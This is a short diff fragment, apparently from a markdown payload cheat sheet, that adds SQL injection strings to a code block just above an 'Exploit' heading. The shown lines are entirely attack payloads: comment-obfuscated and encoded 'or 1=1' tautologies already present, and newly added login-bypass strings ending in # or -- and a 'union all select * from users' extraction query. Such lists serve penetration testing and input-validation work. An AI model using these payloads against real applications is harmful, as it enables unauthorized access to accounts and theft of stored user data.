@@ -36,6 +36,10 @@ a'/**/or/**/'1'='1
 2%0Aor 1=1
 ` desc %23
 IF(0,name,age)
+' or 1=1#
+' or 1=1--
+' or 1=1 LIMIT 1 #
+2 union all select * from users
 ```
 
 ## Exploit
